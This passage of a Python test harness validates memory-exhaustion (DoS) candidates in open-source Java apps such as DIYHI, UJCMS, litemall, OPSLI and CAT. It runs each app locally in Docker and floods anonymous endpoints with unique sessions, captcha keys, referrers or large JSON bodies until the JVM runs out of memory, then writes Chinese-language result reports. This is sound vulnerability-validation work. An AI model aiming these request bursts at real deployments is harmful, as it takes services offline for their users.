            + (DIYHI_DIR / "src" / "main" / "resources" / "data" / "install" / "data_tables_mysql.sql").read_text(
                encoding="utf-8", errors="replace"
            ),
        )
        process, handle, log_path = start_diyhi(case, heap, port, mysql_port)
        result = probe(process, handle, log_path)
        result.evidence.update({"mysqlContainer": mysql_name, "mysqlImage": mysql_image, "mysqlPort": mysql_port})
        return result
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)


def run_diyhi_captcha_cache(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("160m")
    port = 18162
    mysql_port = 33462

    def probe(process, handle, log_path: Path) -> ProbeResult:
        return run_fresh_cookie_get_burst(
            case,
            process,
            handle,
            log_path,
            port,
            lambda index: f"/captcha/p1-{index}-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            heap,
            workers=8,
            max_requests=100000,
            notes="DIYHI 默认 MySQL 初始化后，匿名 GET /captcha/{captchaKey} 使用唯一 captchaKey 写入 Ehcache。",
        )

    return run_diyhi_with_mysql(case, heap, port, mysql_port, probe)


def run_diyhi_login_submit_quantity(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("160m")
    port = 18163
    mysql_port = 33463

    def probe(process, handle, log_path: Path) -> ProbeResult:
        return run_form_post_burst(
            case,
            process,
            handle,
            log_path,
            port,
            "/login",
            lambda index: {
                "type": 10,
                "account": f"p1user{index}",
                "password": "0" * 64,
                "rememberMe": "false",
            },
            heap,
            workers=8,
            max_requests=80000,
            notes="DIYHI 默认前台 POST /login，使用唯一账号触发失败登录 submitQuantity/cache key 增长。",
        )

    return run_diyhi_with_mysql(case, heap, port, mysql_port, probe)


def run_diyhi_statistic_queue(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("160m")
    port = 18164
    mysql_port = 33464

    def probe(process, handle, log_path: Path) -> ProbeResult:
        return run_fresh_cookie_get_burst(
            case,
            process,
            handle,
            log_path,
            port,
            lambda index: "/statistic/add?"
            + urllib.parse.urlencode(
                {
                    "url": f"http://127.0.0.1/topic/{index}",
                    "referrer": f"http://ref-{index}.p1.example.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                }
            ),
            heap,
            workers=8,
            max_requests=100000,
            notes="DIYHI 默认前台 GET /statistic/add 以唯一 url/referrer 填充进程级 PV 队列；未 OOM 则不提升。",
        )

    return run_diyhi_with_mysql(case, heap, port, mysql_port, probe)


def run_jpom_rand_code_sessions(case: Candidate) -> ProbeResult:
    port = 18166
    heap = p0.with_min_heap("160m")
    process, handle, log_path = start_jpom(case, heap, port)
    return run_fresh_cookie_get_burst(
        case,
        process,
        handle,
        log_path,
        port,
        lambda index: f"/rand-code?theme=p1-{index}",
        heap,
        workers=8,
        max_requests=100000,
        notes="JPom server 默认 H2/首次安装态，匿名 GET /rand-code 使用新 cookie 创建一小时 servlet session。",
    )


def run_ujcms_visit_referrer(case: Candidate) -> ProbeResult:
    port = 18168
    mysql_port = 33468
    mysql_name = "p1-ujcms-mysql"
    heap = p0.with_min_heap("384m")
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "password", mysql_version="8.0")
        p0.mysql_exec(
            mysql_name,
            "password",
            "CREATE DATABASE IF NOT EXISTS `ujcms` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\n",
        )
        process, handle, log_path = start_ujcms(case, heap, port, mysql_port)
        result = run_form_post_burst(
            case,
            process,
            handle,
            log_path,
            port,
            "/frontend/visit/1",
            lambda index: {
                "url": f"http://site.example.com/article/{index}",
                "entryUrl": "http://site.example.com/",
                "referrer": f"http://ref-{index}-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.example.com/path",
                "si": index,
                "uv": index,
                "newVisitor": "true",
                "count": 1,
                "duration": 1,
            },
            heap,
            workers=8,
            max_requests=80000,
            notes="UJCMS 默认 MySQL+caffeine，公开 /frontend/visit/{siteId} 保留唯一 referrer/source 统计项；未 OOM 则不提升。",
        )
        result.evidence.update({"mysqlContainer": mysql_name, "mysqlImage": mysql_image, "mysqlPort": mysql_port})
        return result
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)


def run_litemall_admin_captcha_sessions(case: Candidate) -> ProbeResult:
    port = 18176
    mysql_port = 33476
    mysql_name = "p1-litemall-mysql"
    heap = p0.with_min_heap("160m")
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "litemall", mysql_version="8.0")
        p0.mysql_exec(
            mysql_name,
            "litemall",
            (LITEMALL_DIR / "litemall-db" / "sql" / "litemall_schema.sql").read_text(encoding="utf-8", errors="replace"),
        )
        for sql_name in ("litemall_table.sql", "litemall_data.sql"):
            p0.mysql_exec(
                mysql_name,
                "litemall",
                "USE `litemall`;\n"
                + (LITEMALL_DIR / "litemall-db" / "sql" / sql_name).read_text(encoding="utf-8", errors="replace"),
            )
        process, handle, log_path = start_litemall(case, heap, port, mysql_port)
        result = run_fresh_cookie_get_burst(
            case,
            process,
            handle,
            log_path,
            port,
            lambda index: f"/admin/auth/kaptcha?i={index}",
            heap,
            workers=8,
            max_requests=100000,
            notes="litemall 默认 all 模块，匿名 /admin/auth/kaptcha 为新 Shiro subject/session 写入验证码。",
        )
        result.evidence.update({"mysqlContainer": mysql_name, "mysqlImage": mysql_image, "mysqlPort": mysql_port})
        return result
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)


def run_opsli_waf_json_body(case: Candidate) -> ProbeResult:
    port = 18175
    mysql_port = 33475
    redis_port = 34475
    mysql_name = "p1-opsli-mysql"
    redis_name = "p1-opsli-redis"
    heap = p0.with_min_heap("160m")
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "123456", mysql_version="8.0")
        p0.mysql_exec(
            mysql_name,
            "123456",
            "CREATE DATABASE IF NOT EXISTS `opsli-boot` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\n"
            "USE `opsli-boot`;\n"
            + (OPSLI_DIR / "db-file" / "2.2-springboot3" / "opsli-boot.sql").read_text(
                encoding="utf-8", errors="replace"
            ),
        )
        redis_image = start_redis_container_with_password(redis_name, redis_port, "123456")
        process, handle, log_path = start_opsli(case, heap, port, mysql_port, redis_port)
        enhanced = p0.is_heap_at_least(heap, 1024)
        payload = make_large_json_payload("pad", (20 if enhanced else 8) * 1024 * 1024)
        result = run_http_body_burst(
            case,
            process,
            handle,
            log_path,
            port,
            "/opsli-boot/system/login",
            payload,
            heap,
            workers=10 if enhanced else 8,
            loops=30 if enhanced else 24,
            timeout=45 if enhanced else 30,
            extra_evidence={"enhancedProbe": enhanced},
            notes="OPSLI 默认 local profile，WAF 在匿名 /system/login 前复制/过滤 JSON body；只以目标 JVM OOM 为真阳。",
        )
        result.evidence.update(
            {
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "redisContainer": redis_name,
                "redisImage": redis_image,
                "redisPort": redis_port,
            }
        )
        return result
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)
        p0.docker_rm(redis_name)


def run_shopping_cart_jsp_sessions(case: Candidate) -> ProbeResult:
    port = 18181
    mysql_port = 33481
    mysql_name = "p1-shopping-cart-mysql"
    heap = p0.with_min_heap("160m")
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "root", mysql_version="8.0")
        p0.mysql_import_raw(mysql_name, "root", SHOPCART_DIR / "databases" / "mysql_query.sql")
        process, handle, log_path = start_shopping_cart(case, heap, port, mysql_port)
        result = run_fresh_cookie_get_burst(
            case,
            process,
            handle,
            log_path,
            port,
            lambda index: f"/login.jsp?i={index}",
            heap,
            workers=8,
            max_requests=100000,
            notes="ShoppingCart 传统 JSP/Tomcat 默认部署，匿名 login.jsp 访问创建 server-side JSESSIONID。",
        )
        result.evidence.update({"mysqlContainer": mysql_name, "mysqlImage": mysql_image, "mysqlPort": mysql_port})
        return result
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)


def docker_container_running(name: str) -> bool:
    completed = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", name],
        cwd=BASE_DIR,
        check=False,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
    )
    return completed.returncode == 0 and completed.stdout.strip() == "true"


def wait_for_cat_mysql(container: str, timeout: float = 180) -> None:
    deadline = time.monotonic() + timeout
    last_output = ""
    while time.monotonic() < deadline:
        completed = p0.docker_run(["docker", "exec", container, "mysqladmin", "ping", "-uroot", "--silent"])
        if completed.returncode == 0:
            return
        last_output = completed.stdout
        time.sleep(2)
    raise RuntimeError(f"CAT MySQL container {container} did not become ready:\n{last_output}")


def cat_mysql_init_dir(case: Candidate) -> Path:
    source = CAT_DIR / "script"
    target = RUNTIME_DIR / f"{case.candidate_id.lower()}-cat-mysql-init"
    if target.exists():
        shutil.rmtree(target)
    shutil.copytree(source, target)
    target.chmod(0o755)
    for path in target.rglob("*"):
        if path.is_dir():
            path.chmod(0o755)
        else:
            path.chmod(0o644)
    return target


def start_cat_docker(case: Candidate, heap: str, port: int) -> tuple[subprocess.Popen[bytes], object, Path, dict[str, object]]:
    if not p0.docker_available():
        raise RuntimeError("docker is not available for CAT default compose dependency")
    cat_name = f"p1-cat-{case.candidate_id.lower()}"
    mysql_name = f"{cat_name}-mysql"
    network = f"{cat_name}-net"
    p0.docker_rm(cat_name)
    p0.docker_rm(mysql_name)
    p0.docker_run(["docker", "network", "rm", network])
    create_network = p0.docker_run(["docker", "network", "create", network])
    if create_network.returncode != 0:
        raise RuntimeError(f"failed to create CAT docker network {network}:\n{create_network.stdout}")
    mysql_image = p0.docker_pull_first(["mysql:5.7", "docker.1ms.run/mysql:5.7"])
    cat_image = p0.docker_pull_first(["meituaninc/cat:3.0.1", "docker.1ms.run/meituaninc/cat:3.0.1"])
    init_dir = cat_mysql_init_dir(case)
    mysql_run = p0.docker_run(
        [
            "docker",
            "run",
            "-d",
            "--name",
            mysql_name,
            "--network",
            network,
            "-e",
            "MYSQL_ALLOW_EMPTY_PASSWORD=true",
            "-e",
            "MYSQL_DATABASE=cat",
            "-v",
            f"{init_dir}:/docker-entrypoint-initdb.d:ro",
            mysql_image,
            "mysqld",
            "-uroot",
            "--character-set-server=utf8mb4",
            "--collation-server=utf8mb4_unicode_ci",
            "--innodb-flush-log-at-trx-commit=0",
        ]
    )
    if mysql_run.returncode != 0:
        raise RuntimeError(f"failed to start CAT MySQL container:\n{mysql_run.stdout}")
    wait_for_cat_mysql(mysql_name)
    cat_run = p0.docker_run(
        [
            "docker",
            "run",
            "-d",
            "--name",
            cat_name,
            "--network",
            network,
            "-e",
            f"JAVA_OPTS=-Xmx{heap} -Djava.awt.headless=true",
            "-e",
            f"CATALINA_OPTS=-Xmx{heap} -Djava.awt.headless=true",
            "-e",
            f"MYSQL_URL={mysql_name}",
            "-e",
            "MYSQL_PORT=3306",
            "-e",
            "MYSQL_USERNAME=root",
            "-e",
            "MYSQL_PASSWD=",
            "-e",
            "MYSQL_SCHEMA=cat",
            "-v",
            f"{CAT_DIR / 'docker' / 'client.xml'}:/data/appdatas/cat/client.xml:ro",
            "-p",
            f"127.0.0.1:{port}:8080",
            cat_image,
            "/bin/sh",
            "-c",
            "ln -sf /lib/libc.musl-x86_64.so.1 /lib/ld-linux-x86-64.so.2 && ./datasources.sh && catalina.sh run",
        ]
    )
    if cat_run.returncode != 0:
        raise RuntimeError(f"failed to start CAT container:\n{cat_run.stdout}")
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    log_path.parent.mkdir(parents=True, exist_ok=True)
    handle = log_path.open("wb")
    handle.write((f"$ docker logs -f {cat_name}\n").encode("utf-8"))
    handle.flush()
    log_process = subprocess.Popen(["docker", "logs", "-f", cat_name], cwd=BASE_DIR, stdout=handle, stderr=subprocess.STDOUT)
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/cat/s/project?op=domains", 240):
        p0.stop_process(log_process, handle)
        raise RuntimeError(f"CAT container did not serve project API on port {port}; see {rel(log_path)}")
    return log_process, handle, log_path, {
        "catContainer": cat_name,
        "mysqlContainer": mysql_name,
        "network": network,
        "catImage": cat_image,
        "mysqlImage": mysql_image,
    }


def run_cat_project_registry(case: Candidate) -> ProbeResult:
    port = 18124
    heap = p0.with_min_heap("160m")
    log_process = None
    handle = None
    containers: dict[str, object] = {}
    sent = 0
    last_status = 0
    client_exception = ""
    next_index = 0
    lock = threading.Lock()
    try:
        log_process, handle, log_path, containers = start_cat_docker(case, heap, port)

        def worker(worker_id: int) -> None:
            nonlocal sent, last_status, client_exception, next_index
            while True:
                with lock:
                    next_index += 1
                    index = next_index
                if index > 50000 or p0.oom_signal(log_path) or not docker_container_running(str(containers["catContainer"])):
                    return
                try:
                    status, _, _ = p0.form_request(
                        p0.new_cookie_opener(),
                        f"http://127.0.0.1:{port}/cat/s/project?op=projectUpdate",
                        {
                            "project.domain": f"p1-cat-{index}-aaaaaaaaaaaaaaaaaaaaaaaa",
                            "project.cmdbDomain": f"p1-cat-{index}",
                            "project.level": 1,
                            "project.bu": "p1",
                            "project.cmdbProductline": "p1",
                        },
                        timeout=10,
                    )
                    with lock:
                        sent += 1
                        last_status = status
                except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                    with lock:
                        client_exception = repr(exc)
                    return
                if index % 500 == 0:
                    time.sleep(0.005)

        threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(8)]
        for thread in threads:
            thread.start()
        deadline = time.monotonic() + 360
        while time.monotonic() < deadline:
            if p0.oom_signal(log_path) or not docker_container_running(str(containers["catContainer"])):
                break
            if all(not thread.is_alive() for thread in threads):
                break
            time.sleep(0.5)
        for thread in threads:
            thread.join(timeout=2)
        signal = p0.oom_signal(log_path)
        return manual_probe_result(
            case,
            log_process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/cat/s/project?op=projectUpdate",
                "lastHttpStatus": last_status,
                "clientException": client_exception,
                "catContainerRunning": docker_container_running(str(containers["catContainer"])),
                **containers,
            },
            status="verified_oom" if signal else "completed_without_oom",
            dynamic_verdict="confirmed_oom" if signal else "not_confirmed",
            true_positive=bool(signal),
            notes="官方 CAT Docker image + MySQL 初始化，匿名 projectUpdate 唯一 domain 注册；只以 CAT 容器 JVM OOM 日志为真阳。",
        )
    finally:
        if log_process is not None and handle is not None and log_process.poll() is None:
            p0.stop_process(log_process, handle)
        if containers:
            p0.docker_rm(str(containers.get("catContainer", "")))
            p0.docker_rm(str(containers.get("mysqlContainer", "")))
            p0.docker_run(["docker", "network", "rm", str(containers.get("network", ""))])


RUNNERS: dict[str, Callable[[Candidate], ProbeResult]] = {
    "nacos_instance_registration": run_nacos_instance_registration,
    "nacos_config_batch_listen": run_nacos_config_batch_listen,
    "jmqtt_subscribe_tree": run_jmqtt_subscribe_tree,
    "jmqtt_qos2_half_handshake": run_jmqtt_qos2_half_handshake,
    "jmqtt_outbound_no_ack": run_jmqtt_outbound_no_ack,
    "sba_instances_registry": run_sba_instances_registry,
    "sba_application_fanout": run_sba_application_fanout,
    "sba_sse_slow_clients": run_sba_sse_slow_clients,
    "socket_mqtt_publish_retention": run_socket_mqtt_publish_retention,
    "cat_project_registry": run_cat_project_registry,
    "diyhi_captcha_cache": run_diyhi_captcha_cache,
    "diyhi_login_submit_quantity": run_diyhi_login_submit_quantity,
    "diyhi_statistic_queue": run_diyhi_statistic_queue,
    "jpom_rand_code_sessions": run_jpom_rand_code_sessions,
    "ujcms_visit_referrer": run_ujcms_visit_referrer,
    "erupt_captcha_height": run_erupt_captcha_height,
    "erupt_json_body_filter": run_erupt_json_body_filter,
    "rebuild_session_growth": run_rebuild_session_growth,
    "rebuild_barcode_render": run_rebuild_barcode_render,
    "rebuild_api_gateway_body": run_rebuild_api_gateway_body,
    "rebuild_captcha_sessions": run_rebuild_captcha_sessions,
    "opsli_waf_json_body": run_opsli_waf_json_body,
    "litemall_admin_captcha_sessions": run_litemall_admin_captcha_sessions,
    "shopping_cart_jsp_sessions": run_shopping_cart_jsp_sessions,
    "wgcloud_min_task": run_wgcloud_min_task,
    "xxl_boot_repeatable_body": run_xxl_boot_repeatable_body,
    "xxl_boot_login_failures": run_xxl_boot_login_failures,
    "smqtt_persistent_sessions": run_smqtt_persistent_sessions,
    "smqtt_empty_topic_keys": run_smqtt_empty_topic_keys,
    "smqtt_qos2_half_handshake": run_smqtt_qos2_half_handshake,
    "xxl_glue_groovy": run_xxl_glue_groovy,
    "xxl_large_body_aggregator": run_xxl_large_body_aggregator,
    "ryvf_login_repeatable_body": run_ryvf_login_repeatable_body,
    "citrus_authenticate_body": run_citrus_authenticate_body,
    "powerjob_worker_heartbeat": run_powerjob_worker_heartbeat,
}


def blocked_result(case: Candidate) -> ProbeResult:
    return ProbeResult(
        candidate_id=case.candidate_id,
        app=case.app,
        title=case.title,
        status="precondition_blocked",
        dynamic_verdict="not_run",
        true_positive=False,
        oom_signal="",
        requests_sent=0,
        heap="",
        log="",
        evidence={"blockedReason": case.blocked_reason},
        notes=case.blocked_reason,
    )


def error_result(case: Candidate, exc: Exception) -> ProbeResult:
    return ProbeResult(
        candidate_id=case.candidate_id,
        app=case.app,
        title=case.title,
        status="probe_error",
        dynamic_verdict="not_confirmed",
        true_positive=False,
        oom_signal="",
        requests_sent=0,
        heap="",
        log="",
        evidence={"exception": repr(exc)},
        notes=str(exc),
    )


def result_to_dict(result: ProbeResult) -> dict[str, object]:
    return dataclasses.asdict(result)


def load_existing_results() -> list[ProbeResult]:
    path = OUT_DIR / "summary.json"
    if not path.exists():
        return []
    rows = json.loads(path.read_text(encoding="utf-8"))
    return [ProbeResult(**row) for row in rows]


def merge_results(existing: list[ProbeResult], updates: list[ProbeResult]) -> list[ProbeResult]:
    by_id = {result.candidate_id: result for result in existing}
    by_id.update({result.candidate_id: result for result in updates})
    ordered: list[ProbeResult] = []
    seen: set[str] = set()
    for case in P1_CANDIDATES:
        result = by_id.get(case.candidate_id)
        if result is not None:
            ordered.append(result)
            seen.add(case.candidate_id)
    for result in existing + updates:
        if result.candidate_id not in seen:
            ordered.append(result)
            seen.add(result.candidate_id)
    return ordered


def render_report(results: list[ProbeResult]) -> str:
    first_priority_ids = set(FIRST_PRIORITY_CASE_IDS)
    verified = [result for result in results if p0.strict_true_positive(result)]
    blocked = [result for result in results if result.status == "precondition_blocked"]
    completed = [result for result in results if result.status == "completed_without_oom"]
    errors = [result for result in results if result.status == "probe_error"]
    not_confirmed = [
        result
        for result in results
        if not p0.strict_true_positive(result) and result.status not in {"precondition_blocked", "completed_without_oom", "probe_error"}
    ]
    first_priority = [result for result in results if result.candidate_id in first_priority_ids]
    first_verified = [result for result in first_priority if p0.strict_true_positive(result)]
    first_completed = [result for result in first_priority if result.status == "completed_without_oom"]
    first_errors = [result for result in first_priority if result.status == "probe_error"]
    first_blocked = [result for result in first_priority if result.status == "precondition_blocked"]
    lines = [
        "# P1 应用级动态验证结果",
        "",
        f"- 生成时间：{time.strftime('%Y-%m-%d %H:%M:%S')}",
        f"- 输入清单：`{rel(SOURCE_PLAN)}` 的 P1 候选",
        f"- 输出目录：`{rel(OUT_DIR)}/`",
        "- 真阳性门槛：必须由真实外部协议/HTTP 请求触发目标 JVM `OutOfMemoryError`、native thread exhaustion 或等价持续不可用，且目标 JVM 堆至少为 1GiB；小堆 OOM、资源增长、超时、缓存 key 增长或环境缺口不提升为真阳性。",
        "",
        "## 总览",
        "",
        f"- P1 候选总数：{len(results)}",
        f"- 已确认目标资源失败真阳性：{len(verified)}",
        f"- 已执行但未确认目标资源失败：{len(completed)}",
        f"- 探针错误：{len(errors)}",
        f"- 默认环境/前置条件阻塞：{len(blocked)}",
        f"- 第一优先级补测：{len(first_priority)} 项，其中确认目标资源失败 {len(first_verified)}、已执行未确认 {len(first_completed)}、探针错误 {len(first_errors)}、前置条件阻塞 {len(first_blocked)}",
        "",
        "## 逐项结果",
        "",
        "| candidate | app | status | true_positive | oom_signal | requests | log |",
        "| --- | --- | --- | --- | --- | --- | --- |",
    ]
    for result in results:
        log = f"`{result.log}`" if result.log else ""
        signal = result.oom_signal or ""
        lines.append(
            f"| `{result.candidate_id}` | `{result.app}` | `{result.status}` | "
            f"{str(p0.strict_true_positive(result)).lower()} | `{signal}` | {result.requests_sent} | {log} |"
        )
    lines.extend(["", "## 真阳性", ""])
    if verified:
        for result in verified:
            lines.extend(
                [
                    f"### `{result.candidate_id}`",
                    "",
                    f"- 应用：`{result.app}`",
                    f"- 结论：`{result.dynamic_verdict}`",
                    f"- 失败信号：`{result.oom_signal}`",
                    f"- 请求数：{result.requests_sent}",
                    f"- 堆限制：`{result.heap}`",
                    f"- 原始日志：`{result.log}`",
                    f"- 证据：`{json.dumps(result.evidence, ensure_ascii=False)}`",
                    "",
                ]
            )
    else:
        lines.extend(["本轮没有候选达到真实目标资源失败真阳性门槛。", ""])
    if completed:
        lines.extend(["## 已执行但未确认目标资源失败", ""])
        for result in completed:
            log = f"；日志 `{result.log}`" if result.log else ""
            lines.append(f"- `{result.candidate_id}`：`{result.status}`；请求数 {result.requests_sent}{log}；{result.notes}")
        lines.append("")
    if errors:
        lines.extend(["## 探针错误", ""])
        for result in errors:
            lines.append(f"- `{result.candidate_id}`：{result.notes}")
        lines.append("")
    if not_confirmed:
        lines.extend(["## 其他未确认", ""])
        for result in not_confirmed:
            log = f"；日志 `{result.log}`" if result.log else ""
            lines.append(f"- `{result.candidate_id}`：`{result.status}`；请求数 {result.requests_sent}{log}；{result.notes}")
        lines.append("")
    if first_priority:
        lines.extend(["## 第一优先级补测结果", ""])
        lines.append(
            f"- 范围：{len(first_priority)} 项；确认目标资源失败 {len(first_verified)}，已执行未确认 {len(first_completed)}，探针错误 {len(first_errors)}，前置条件阻塞 {len(first_blocked)}。"
        )
        if first_verified:
            lines.append(f"- 确认目标资源失败：{', '.join(f'`{result.candidate_id}`' for result in first_verified)}")
        if first_completed:
            lines.append(f"- 已执行未确认：{', '.join(f'`{result.candidate_id}`' for result in first_completed)}")
        if first_errors:
            lines.append(f"- 探针错误：{', '.join(f'`{result.candidate_id}`' for result in first_errors)}")
        if first_blocked:
            lines.append(f"- 前置条件阻塞：{', '.join(f'`{result.candidate_id}`' for result in first_blocked)}")
        lines.append("")
    if blocked:
        lines.extend(["## 前置条件阻塞", ""])
        for result in blocked:
            lines.append(f"- `{result.candidate_id}`：{result.notes}")
        lines.append("")
    return "\n".join(lines)


def write_results(results: list[ProbeResult]) -> None:
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
    rows = []
    for result in results:
        row = result_to_dict(result)
        row["true_positive"] = p0.strict_true_positive(result)
        rows.append(row)
    (OUT_DIR / "summary.json").write_text(json.dumps(rows, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    with (OUT_DIR / "findings.jsonl").open("w", encoding="utf-8") as handle:
        for row in rows:
            handle.write(json.dumps(row, ensure_ascii=False) + "\n")
    with (OUT_DIR / "summary.csv").open("w", encoding="utf-8", newline="") as handle:
        fieldnames = [
            "candidate_id",
            "app",
            "status",
            "dynamic_verdict",
            "true_positive",
            "oom_signal",
            "requests_sent",
            "heap",
            "log",
            "notes",
        ]
        writer = csv.DictWriter(handle, fieldnames=fieldnames)
        writer.writeheader()
        for result in results:
            row = {field: getattr(result, field) for field in fieldnames}
            row["true_positive"] = p0.strict_true_positive(result)
            writer.writerow(row)
    (OUT_DIR / "P1_DYNAMIC_VALIDATION_REPORT.md").write_text(render_report(results), encoding="utf-8")


def selected_candidates(
    case_ids: list[str],
    runnable_only: bool = False,
    first_priority: bool = False,
) -> list[Candidate]:
    candidates = list(P1_CANDIDATES)
    if first_priority:
        first_priority_set = set(FIRST_PRIORITY_CASE_IDS)
        candidates = [case for case in candidates if case.candidate_id in first_priority_set]
    if runnable_only:
        candidates = [case for case in candidates if case.runner is not None]
    if not case_ids:
        return candidates
    by_id = {case.candidate_id: case for case in P1_CANDIDATES}
    missing = sorted(set(case_ids) - set(by_id))
    if missing:
        raise ValueError(f"unknown P1 candidate(s): {', '.join(missing)}")
    selected = [by_id[case_id] for case_id in case_ids]
    if first_priority:
        allowed = set(FIRST_PRIORITY_CASE_IDS)
        outside = [case.candidate_id for case in selected if case.candidate_id not in allowed]
        if outside:
            raise ValueError(f"case(s) are not in FIRST_PRIORITY_CASE_IDS: {', '.join(outside)}")
    if runnable_only:
        selected = [case for case in selected if case.runner is not None]
    return selected


def run_candidates(candidates: list[Candidate], base_results: list[ProbeResult] | None = None) -> list[ProbeResult]:
    updates: list[ProbeResult] = []
    for case in candidates:
        print(f"== {case.candidate_id} {case.app}")
        if case.runner is None:
            result = blocked_result(case)
        else:
            try:
                result = RUNNERS[case.runner](case)
            except Exception as exc:
                result = error_result(case, exc)
        print(f"{case.candidate_id}: {result.status} {result.oom_signal}")
        updates.append(result)
        if base_results is None:
            write_results(updates)
        else:
            write_results(merge_results(base_results, updates))
    return updates if base_results is None else merge_results(base_results, updates)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--case", action="append", default=[], help="P1 candidate id to run; defaults to all")
    parser.add_argument("--first-priority", action="store_true", help="run only the first-priority P1 precondition-blocked cases")
    parser.add_argument("--runnable-only", action="store_true", help="only run currently implemented P1 probes")
    parser.add_argument("--min-heap", default="", help="raise every probe JVM heap to at least this size, e.g. 1g")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    p0.MIN_HEAP_OVERRIDE = args.min_heap
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
    try:
        candidates = selected_candidates(args.case, runnable_only=args.runnable_only, first_priority=args.first_priority)
        base_results = load_existing_results() if args.case or args.runnable_only or args.first_priority else None
        results = run_candidates(candidates, base_results=base_results)
    except Exception as exc:
        print(f"application P1 dynamic validation failed: {exc}", file=p0.sys.stderr)
        return 1
    verified = sum(1 for result in results if p0.strict_true_positive(result))
    print(f"wrote {rel(OUT_DIR / 'summary.json')} confirmed_resource_failures={verified}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
